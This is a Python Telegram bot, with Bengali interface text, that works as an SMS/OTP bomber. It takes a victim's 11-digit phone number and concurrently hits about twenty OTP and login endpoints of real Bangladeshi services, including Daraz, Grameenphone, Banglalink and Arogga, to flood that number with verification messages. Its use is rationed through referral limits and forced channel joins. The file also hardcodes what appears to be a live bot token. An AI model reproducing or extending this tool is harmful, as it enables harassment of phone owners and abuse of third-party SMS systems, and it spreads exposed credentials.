import logging
import sqlite3
import uuid
import requests
import asyncio
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# ===== কনফিগারেশন =====
BOT_TOKEN = "8679921207:AAFmrtDTSM0d41iC76Ln9R_ECqMJWIiKf7Q"
ADMIN_ID = 8210146346
CHANNEL_1 = "@primiumboss29"
CHANNEL_2 = "@saniedit9"
ADMIN_USERNAME = "@jiolinhacker"

# লগিং
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# থ্রেড পুল
executor = ThreadPoolExecutor(max_workers=15)

# ===== API গুলো =====

# 4টি GET API
GET_APIS = [
    {"name": "🟢 Robi", "url": "https://www.robi.com.bd/en"},
    {"name": "🟢 Airtel", "url": "https://www.bd.airtel.com/en"},
    {"name": "🟢 API-3", "url": "https://example.com/api3"},
    {"name": "🟢 API-4", "url": "https://example.com/api4"}
]

# 15টি POST API
POST_APIS = [
    {"name": "🔵 Bikroy", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login"},
    {"name": "🔵 Bioscope", "url": "https://api-dynamic.bioscopelive.com/v2/auth/login"},
    {"name": "🔵 Daraz", "url": "https://acs-m.daraz.com.bd/h5/mtop.lazada.member.user.biz.sendverificationsms/1.0/"},
    {"name": "🔵 Banglalink", "url": "https://web-api.banglalink.net/api/v1/user/otp-login/request"},
    {"name": "🔵 Grameenphone", "url": "https://webloginda.grameenphone.com/backend/api/v1/otp"},
    {"name": "🔵 Shikho", "url": "https://api.shikho.com/auth/v2/send/sms"},
    {"name": "🔵 Shwapno", "url": "https://www.shwapno.com/api/auth"},
    {"name": "🔵 MewMew Shop", "url": "https://mewmewshopbd.com/send-otp-to-user"},
    {"name": "🔵 Rang BD", "url": "https://api.rang-bd.com/api/auth/otp"},
    {"name": "🔵 Shopz", "url": "https://www.shopz.com.bd/api/v1/auth/send-otp"},
    {"name": "🔵 Cartup", "url": "https://api.cartup.com/customer/api/v1/customer/auth/new-onboard/signup"},
    {"name": "🔵 Rokomari", "url": "https://www.rokomari.com/login/check"},
    {"name": "🔵 Arogga", "url": "https://api.arogga.com/auth/v1/sms/send"},
    {"name": "🔵 Medeasy", "url": "https://api.medeasy.health/api/send-otp/"},
    {"name": "🔵 OSudpotro", "url": "https://api.osudpotro.com/api/v1/users/send_otp"},
    {"name": "🔵 Epharma", "url": "https://epharma.com.bd/authentication/send-otp"},
    {"name": "🔵 Lifeplus", "url": "https://lifeplusbd.com/register"}
]

ALL_APIS = GET_APIS + POST_APIS

# ===== ডাটাবেস =====
def init_db():
    try:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS users
                     (user_id INTEGER PRIMARY KEY,
                      username TEXT,
                      referral_code TEXT UNIQUE,
                      referrer_id INTEGER,
                      limit_count INTEGER DEFAULT 4,
                      verified INTEGER DEFAULT 0,
                      created_at TEXT)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS logs
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      user_id INTEGER,
                      phone TEXT,
                      total_apis INTEGER,
                      success_count INTEGER,
                      created_at TEXT)''')
        
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"DB Error: {e}")

init_db()

def get_user(user_id):
    try:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        user = c.fetchone()
        conn.close()
        return user
    except:
        return None

def create_user(user_id, username, referrer_id=None):
    try:
        referral_code = str(uuid.uuid4())[:8]
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        limit_val = 2 if referrer_id else 4
        
        c.execute('''INSERT OR IGNORE INTO users 
                     (user_id, username, referral_code, referrer_id, limit_count, created_at)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (user_id, username, referral_code, referrer_id, limit_val, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        return referral_code
    except:
        return None

def decrease_limit(user_id):
    try:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute('UPDATE users SET limit_count = limit_count - 1 WHERE user_id = ?', (user_id,))
        conn.commit()
        conn.close()
    except:
        pass

def count_referrals(user_id):
    try:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM users WHERE referrer_id = ?', (user_id,))
        count = c.fetchone()[0]
        conn.close()
        return count
    except:
        return 0

def log_usage(user_id, phone, total, success):
    try:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute('''INSERT INTO logs 
                     (user_id, phone, total_apis, success_count, created_at)
                     VALUES (?, ?, ?, ?, ?)''',
                  (user_id, phone, total, success, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    except:
        pass

# ===== API কল =====

def call_get_api(api_config, phone):
    """GET API কল করুন"""
    try:
        params = {"phone": phone}
        response = requests.get(api_config["url"], params=params, timeout=3)
        return response.status_code in [200, 201]
    except:
        return False

def call_post_api(api_config, phone):
    """POST API কল করুন"""
    try:
        data = {"phone": phone}
        response = requests.post(api_config["url"], json=data, timeout=3)
        return response.status_code in [200, 201]
    except:
        return False

async def call_all_apis(phone):
    """সব API কল করুন (GET এবং POST আলাদা)"""
    try:
        loop = asyncio.get_event_loop()
        tasks = []
        
        # GET APIs
        for api in GET_APIS:
            task = loop.run_in_executor(executor, call_get_api, api, phone)
            tasks.append(task)
        
        # POST APIs
        for api in POST_APIS:
            task = loop.run_in_executor(executor, call_post_api, api, phone)
            tasks.append(task)
        
        results = await asyncio.gather(*tasks)
        return results
    except Exception as e:
        logger.error(f"API Error: {e}")
        return [False] * len(ALL_APIS)

# ===== কমান্ড =====

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """স্টার্ট"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    
    user = get_user(user_id)
    if not user:
        create_user(user_id, username)
        kb = [[InlineKeyboardButton("✅ যোগ দিন", callback_data="join")]]
        await update.message.reply_text(
            f"🎉 স্বাগতম!\n\n"
            f"চ্যানেলে যোগ দিয়ে যাচাই করুন:\n"
            f"{CHANNEL_1}\n{CHANNEL_2}",
            reply_markup=InlineKeyboardMarkup(kb)
        )
    else:
        if user[5] == 0:
            kb = [[InlineKeyboardButton("✅ যাচাই করুন", callback_data="verify")]]
            await update.message.reply_text("⏳ যাচাই করুন", reply_markup=InlineKeyboardMarkup(kb))
        else:
            await menu(update, context)

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """মেনু"""
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    if not user:
        return
    
    kb = [
        [InlineKeyboardButton("🔗 রেফার লিংক", callback_data="ref_link")],
        [InlineKeyboardButton("👥 রেফার সংখ্যা", callback_data="ref_count")],
        [InlineKeyboardButton("📱 OTP পাঠান", callback_data="send_otp")],
        [InlineKeyboardButton("📞 এডমিন", callback_data="admin")]
    ]
    
    text = (
        f"👤 স্বাগতম!\n\n"
        f"📊 তথ্য:\n"
        f"• লিমিট: {user[4]} ⚡\n"
        f"• স্ট্যাটাস: ✅ যাচাইকৃত"
    )
    
    try:
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))
        else:
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb))
    except:
        pass

# ===== কলব্যাক =====

async def callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """কলব্যাক হ্যান্ডলার"""
    q = update.callback_query
    
    try:
        await q.answer()
    except:
        pass
    
    user_id = q.from_user.id
    user = get_user(user_id)
    
    if not user:
        return
    
    # রেফার লিংক
    if q.data == "ref_link":
        link = f"https://t.me/saniedit9_bot?start={user[2]}"
        kb = [[InlineKeyboardButton("🔙 ফিরে যান", callback_data="back")]]
        try:
            await q.edit_message_text(f"🔗 লিংক:\n\n`{link}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        except:
            pass
    
    # রেফার সংখ্যা
    elif q.data == "ref_count":
        count = count_referrals(user_id)
        kb = [[InlineKeyboardButton("🔙 ফিরে যান", callback_data="back")]]
        try:
            await q.edit_message_text(f"👥 রেফার: {count}\n💰 লিমিট: {count * 2}", reply_markup=InlineKeyboardMarkup(kb))
        except:
            pass
    
    # OTP পাঠান
    elif q.data == "send_otp":
        if user[4] <= 0:
            kb = [[InlineKeyboardButton("🔙 ফিরে যান", callback_data="back")]]
            try:
                await q.edit_message_text("❌ লিমিট শেষ!", reply_markup=InlineKeyboardMarkup(kb))
            except:
                pass
            return
        
        try:
            await q.edit_message_text("📞 নম্বর দিন (১১ ডিজিট):\nউদাহরণ: 01700000000")
        except:
            pass
        
        context.user_data['waiting_phone'] = True
    
    # এডমিন
    elif q.data == "admin":
        kb = [[InlineKeyboardButton("🔙 ফিরে যান", callback_data="back")]]
        try:
            await q.edit_message_text(f"📞 এডমিন: {ADMIN_USERNAME}", reply_markup=InlineKeyboardMarkup(kb))
        except:
            pass
    
    # যাচাই
    elif q.data == "verify":
        kb = [[InlineKeyboardButton("✅ সম্পন্ন", callback_data="verify_ok")]]
        try:
            await q.edit_message_text(f"✅ চ্যানেলে যোগ দিন:\n{CHANNEL_1}\n{CHANNEL_2}", reply_markup=InlineKeyboardMarkup(kb))
        except:
            pass
    
    # যাচাই সম্পন্ন
    elif q.data == "verify_ok":
        try:
            conn = sqlite3.connect('users.db')
            c = conn.cursor()
            c.execute('UPDATE users SET verified = 1 WHERE user_id = ?', (user_id,))
            conn.commit()
            conn.close()
            await q.edit_message_text("🎉 যাচাই সম্পূর্ণ! /start লিখুন।")
        except:
            pass
    
    # যোগ দিন
    elif q.data == "join":
        kb = [[InlineKeyboardButton("✅ যাচাই করুন", callback_data="verify")]]
        try:
            await q.edit_message_text("চ্যানেলে যোগ দিয়ে যাচাই করুন।", reply_markup=InlineKeyboardMarkup(kb))
        except:
            pass
    
    # ফিরে যান
    elif q.data == "back":
        await menu(update, context)

# ===== মেসেজ হ্যান্ডলার =====

async def message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """নম্বর ইনপুট"""
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    if not user or not context.user_data.get('waiting_phone'):
        return
    
    phone = update.message.text.strip()
    
    # নম্বর যাচাই
    if not phone.isdigit() or len(phone) != 11:
        await update.message.reply_text("❌ ১১ ডিজিটের নম্বর দিন।")
        return
    
    # লিমিট কমান
    decrease_limit(user_id)
    user = get_user(user_id)
    
    # পাঠানো শুরু
    msg = await update.message.reply_text(f"⏳ সব API তে পাঠাচ্ছি...\n📱 নম্বর: {phone}")
    
    # API কল করুন
    results = await call_all_apis(phone)
    success = sum(1 for r in results if r)
    total = len(ALL_APIS)
    
    # লগ করুন
    log_usage(user_id, phone, total, success)
    
    # রেজাল্ট
    result_text = (
        f"✅ সফল!\n\n"
        f"📱 নম্বর: {phone}\n"
        f"📊 কোড সেন্ড: {success}/{total}\n"
        f"⚡ বাকি লিমিট: {user[4]}"
    )
    
    try:
        await msg.edit_text(result_text)
    except:
        pass
    
    context.user_data['waiting_phone'] = False

# ===== মেইন =====

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CallbackQueryHandler(callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message))
    
    logger.info("🤖 বট চালু হচ্ছে...")
    app.run_polling()

if __name__ == '__main__':
    main()
